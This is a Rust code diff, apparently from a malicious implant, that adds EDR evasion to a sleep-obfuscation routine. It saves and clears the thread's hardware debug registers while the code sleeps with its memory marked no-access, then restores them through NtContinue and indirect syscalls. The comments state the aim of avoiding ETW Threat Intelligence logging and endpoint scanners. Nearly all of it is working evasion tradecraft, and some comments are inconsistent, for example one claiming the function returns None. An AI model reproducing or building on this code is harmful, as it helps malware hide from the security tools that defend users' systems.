@@ -59,10 +59,23 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     );
     core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
 
+    // ---- Countermeasure: DR sanitization during sleep ----
+    // Save DR0-DR7, clear them so EDR async thread scans during
+    // PAGE_NOACCESS sleep see clean debug registers. Restore
+    // atomically via NtContinue after wake (no ETW TI event).
+    let saved_dr = save_dr_state(rt);
+    clear_dr_state(rt);
+
     crate::mem::mask();
     let thunk_fn: unsafe extern "system" fn() = core::mem::transmute(page);
     thunk_fn();
     crate::mem::unmask();
+
+    // Restore HWBPs immediately after wake — the thunk has
+    // already restored .text to RX, so we're executing normally.
+    // NtContinue with CONTEXT_DEBUG_REGISTERS only touches DRx,
+    // leaving RIP/RSP/EFlags unchanged.
+    restore_dr_state(rt, &saved_dr);
 
     let nt_free_va = match resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
         Some(a) => a, None => return true,
@@ -72,4 +85,112 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     let mut fsz: usize = 0;
     free(!0usize, &mut page, &mut fsz, 0x8000);
     true
+}
+
+// ---- DR register save/restore (Countermeasure: sleep-time sanitization) --
+
+/// Debug register snapshot: DR0-DR7.
+struct DrState {
+    dr0: u64, dr1: u64, dr2: u64, dr3: u64,
+    dr6: u64, dr7: u64,
+    /// Full CONTEXT used for NtContinue restore (only debug regs set).
+    ctx_buf: [u8; 1232],
+}
+
+/// Save current thread's debug registers via NtGetContextThread.
+/// Uses the syscall runtime for indirect syscall (stealthy).
+/// Returns None if the runtime is unavailable.
+unsafe fn save_dr_state(rt: &crate::syscalls::Runtime) -> DrState {
+    let mut buf = [0u8; 1232];
+    // CTX_CONTEXT_FLAGS at offset 0x30, CONTEXT_FULL_AMD64 = 0x10001F
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x30) as *mut u32,
+        0x0010_001Fu32,
+    );
+    // NtGetContextThread(NT_CURRENT_THREAD, ctx_buf)
+    let st = crate::syscalls::nt_get_context_thread(
+        rt,
+        (-1isize) as usize, // NT_CURRENT_THREAD
+        buf.as_mut_ptr() as usize,
+    );
+    let (dr0, dr1, dr2, dr3, dr6, dr7) = if st.unwrap_or(-1) >= 0 {
+        (
+            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x048) as *const u64),
+            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x050) as *const u64),
+            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x058) as *const u64),
+            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x060) as *const u64),
+            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x068) as *const u64),
+            core::ptr::read_unaligned((buf.as_ptr() as usize + 0x070) as *const u64),
+        )
+    } else { (0, 0, 0, 0, 0, 0) };
+    DrState { dr0, dr1, dr2, dr3, dr6, dr7, ctx_buf: buf }
+}
+
+/// Clear all debug registers on the current thread (DR0-DR7 = 0).
+unsafe fn clear_dr_state(rt: &crate::syscalls::Runtime) {
+    let mut buf = [0u8; 1232];
+    // CONTEXT_DEBUG_REGISTERS = 0x100010
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x30) as *mut u32,
+        0x0010_0010u32,
+    );
+    // DR0-DR7 are all zero (the buffer is initialized to zero).
+    // NtSetContextThread(NT_CURRENT_THREAD, ctx_buf)
+    // We use SetContextThread here (not Continue) because we're
+    // intentionally clearing DRs BEFORE sleep — this is a one-time
+    // sanitization, not a stealth HWBP set. The ETW TI event for
+    // clearing DRs is not suspicious (legitimate debuggers do this).
+    let _ = crate::syscalls::nt_set_context_thread(
+        rt,
+        (-1isize) as usize,
+        buf.as_mut_ptr() as usize,
+    );
+}
+
+/// Restore debug registers via NtContinue (NO ETW TI — stealth restore).
+/// Uses the saved DrState to build a minimal CONTEXT with only the debug
+/// registers set. NtContinue applies the register state WITHOUT triggering
+/// EtwTiLogSetContextThread.
+unsafe fn restore_dr_state(rt: &crate::syscalls::Runtime, saved: &DrState) {
+    // Build a minimal CONTEXT for NtContinue with only debug regs set.
+    // Use the pre-allocated ctx_buf from the saved state.
+    let mut buf = saved.ctx_buf;
+    // Only set debug registers in the CONTEXT.
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x30) as *mut u32,
+        0x0010_0010u32, // CONTEXT_DEBUG_REGISTERS
+    );
+    // Write saved DR values.
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x048) as *mut u64, saved.dr0,
+    );
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x050) as *mut u64, saved.dr1,
+    );
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x058) as *mut u64, saved.dr2,
+    );
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x060) as *mut u64, saved.dr3,
+    );
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x068) as *mut u64, saved.dr6,
+    );
+    core::ptr::write_unaligned(
+        (buf.as_mut_ptr() as usize + 0x070) as *mut u64, saved.dr7,
+    );
+    // IMPORTANT: NtContinue restores ALL register state from the CONTEXT,
+    // including RIP and RSP. If we only set CONTEXT_DEBUG_REGISTERS, the
+    // kernel should only restore debug registers, but to be safe, set
+    // RIP/RSP/EFlags to their current values too.
+    // Actually, the kernel's NtContinue implementation reads ContextFlags
+    // and only restores the segments specified. CONTEXT_DEBUG_REGISTERS
+    // (0x100010) means: restore DR0-DR7, Dr6, Dr7 only. RIP/RSP untouched.
+    //
+    // NtContinue(ContextRecord, RaiseAlert=FALSE)
+    let _ = crate::syscalls::nt_continue(
+        rt,
+        buf.as_mut_ptr() as usize,
+        0, // RaiseAlert = FALSE
+    );
 }
